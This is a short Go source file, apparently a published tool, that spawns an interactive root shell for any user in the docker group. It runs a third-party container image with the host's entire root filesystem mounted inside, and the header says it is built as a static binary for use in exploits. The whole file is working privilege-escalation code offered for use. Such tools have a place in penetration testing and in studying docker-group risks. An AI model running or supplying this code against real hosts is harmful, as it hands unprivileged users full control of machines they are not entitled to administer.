// dockershell.go
// Gives a rootshell if you are in the docker group.
// Compiled to static binary to be used in exploits
// nighter - http://nighter.se
package main

import (
	"fmt"
	"os/exec"

	gexpect "github.com/ThomasRooney/gexpect"
	"github.com/tebeka/atexit"
)

func handler() {

	cmd := exec.Command("docker", "stop", "dockershell")
	cmd.Start()

	cmdrmi := exec.Command("docker", "rmi", "nighter/givemeroot")
	cmdrmi.Start()

	fmt.Println("Exiting")
}

func main() {

	atexit.Register(handler)

	child, err := gexpect.Spawn("docker run --rm --name dockershell -v /:/mnt -i -t nighter/givemeroot")
	if err != nil {
		panic(err)
	}

	child.Interact()
	atexit.Exit(0)
}
